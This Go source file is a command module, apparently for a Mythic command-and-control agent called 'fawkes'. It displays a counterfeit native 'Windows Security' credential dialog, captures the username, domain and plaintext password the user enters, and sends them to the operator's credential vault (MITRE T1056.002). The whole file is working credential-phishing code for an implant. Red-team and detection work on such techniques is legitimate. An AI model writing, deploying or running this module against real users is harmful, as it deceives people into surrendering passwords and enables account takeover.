//go:build windows

package commands

import (
	"encoding/json"
	"fmt"
	"os/user"
	"strings"
	"syscall"
	"unsafe"

	"fawkes/pkg/structs"
)

var (
	credui                                = syscall.NewLazyDLL("credui.dll")
	procCredUIPromptForWindowsCredentials = credui.NewProc("CredUIPromptForWindowsCredentialsW")
	procCredUnPackAuthenticationBuffer    = credui.NewProc("CredUnPackAuthenticationBufferW")
)

const (
	creduiwinGeneric   = 0x1  // Return username/password in plain text
	errorSuccess       = 0    // ERROR_SUCCESS
	errorCancelled     = 1223 // ERROR_CANCELLED
	credMaxStringLen   = 256  // Max length for unpacked credential strings
)

// credUIInfoW matches the CREDUI_INFOW struct layout on 64-bit Windows.
type credUIInfoW struct {
	cbSize         uint32
	_              uint32   // padding for 8-byte alignment
	hwndParent     uintptr
	pszMessageText *uint16
	pszCaptionText *uint16
	hbmBanner      uintptr
}

// CredentialPromptCommand displays a native Windows credential dialog to harvest user credentials.
type CredentialPromptCommand struct{}

func (c *CredentialPromptCommand) Name() string {
	return "credential-prompt"
}

func (c *CredentialPromptCommand) Description() string {
	return "Display a native credential dialog to capture user credentials (T1056.002)"
}

func (c *CredentialPromptCommand) Execute(task structs.Task) structs.CommandResult {
	var args struct {
		Title   string `json:"title"`
		Message string `json:"message"`
	}

	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error parsing parameters: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
	}

	title := args.Title
	if title == "" {
		title = "Windows Security"
	}
	message := args.Message
	if message == "" {
		message = "Enter your credentials to continue."
	}

	// Convert strings to UTF-16 for Windows API
	msgPtr, _ := syscall.UTF16PtrFromString(message)
	captionPtr, _ := syscall.UTF16PtrFromString(title)

	uiInfo := credUIInfoW{
		cbSize:         uint32(unsafe.Sizeof(credUIInfoW{})),
		pszMessageText: msgPtr,
		pszCaptionText: captionPtr,
	}

	var authPackage uint32
	var outAuthBuffer uintptr
	var outAuthBufferSize uint32
	save := false

	ret, _, _ := procCredUIPromptForWindowsCredentials.Call(
		uintptr(unsafe.Pointer(&uiInfo)),
		0, // dwAuthError
		uintptr(unsafe.Pointer(&authPackage)),
		0, // pvInAuthBuffer
		0, // ulInAuthBufferSize
		uintptr(unsafe.Pointer(&outAuthBuffer)),
		uintptr(unsafe.Pointer(&outAuthBufferSize)),
		uintptr(unsafe.Pointer(&save)),
		creduiwinGeneric,
	)

	if ret == errorCancelled {
		return structs.CommandResult{
			Output:    "User cancelled the dialog",
			Status:    "success",
			Completed: true,
		}
	}

	if ret != errorSuccess {
		return structs.CommandResult{
			Output:    fmt.Sprintf("CredUIPromptForWindowsCredentials failed: error %d", ret),
			Status:    "error",
			Completed: true,
		}
	}

	// Unpack the authentication buffer to get username, domain, password
	defer procCoTaskMemFree.Call(outAuthBuffer)

	userBuf := make([]uint16, credMaxStringLen)
	domainBuf := make([]uint16, credMaxStringLen)
	passBuf := make([]uint16, credMaxStringLen)
	userLen := uint32(credMaxStringLen)
	domainLen := uint32(credMaxStringLen)
	passLen := uint32(credMaxStringLen)

	ok, _, err := procCredUnPackAuthenticationBuffer.Call(
		0, // dwFlags
		outAuthBuffer,
		uintptr(outAuthBufferSize),
		uintptr(unsafe.Pointer(&userBuf[0])),
		uintptr(unsafe.Pointer(&userLen)),
		uintptr(unsafe.Pointer(&domainBuf[0])),
		uintptr(unsafe.Pointer(&domainLen)),
		uintptr(unsafe.Pointer(&passBuf[0])),
		uintptr(unsafe.Pointer(&passLen)),
	)

	if ok == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("CredUnPackAuthenticationBuffer failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	username := syscall.UTF16ToString(userBuf[:userLen])
	domain := syscall.UTF16ToString(domainBuf[:domainLen])
	password := syscall.UTF16ToString(passBuf[:passLen])

	// Zero out the password buffer
	for i := range passBuf {
		passBuf[i] = 0
	}

	if password == "" {
		return structs.CommandResult{
			Output:    "User submitted empty password",
			Status:    "success",
			Completed: true,
		}
	}

	// Build display account name
	account := username
	if domain != "" {
		account = domain + `\` + username
	}

	// Fallback to current user if username is empty
	if username == "" {
		if u, err := user.Current(); err == nil {
			account = u.Username
			username = u.Username
		}
	}

	var sb strings.Builder
	sb.WriteString("=== Credential Prompt Result ===\n\n")
	if domain != "" {
		sb.WriteString(fmt.Sprintf("Domain:   %s\n", domain))
	}
	sb.WriteString(fmt.Sprintf("User:     %s\n", username))
	sb.WriteString(fmt.Sprintf("Password: %s\n", password))
	sb.WriteString(fmt.Sprintf("Dialog:   %s\n", title))

	// Report credential to Mythic vault
	realm := "local"
	if domain != "" {
		realm = domain
	}

	creds := []structs.MythicCredential{
		{
			CredentialType: "plaintext",
			Realm:          realm,
			Account:        account,
			Credential:     password,
			Comment:        "credential-prompt dialog",
		},
	}

	return structs.CommandResult{
		Output:      sb.String(),
		Status:      "success",
		Completed:   true,
		Credentials: &creds,
	}
}
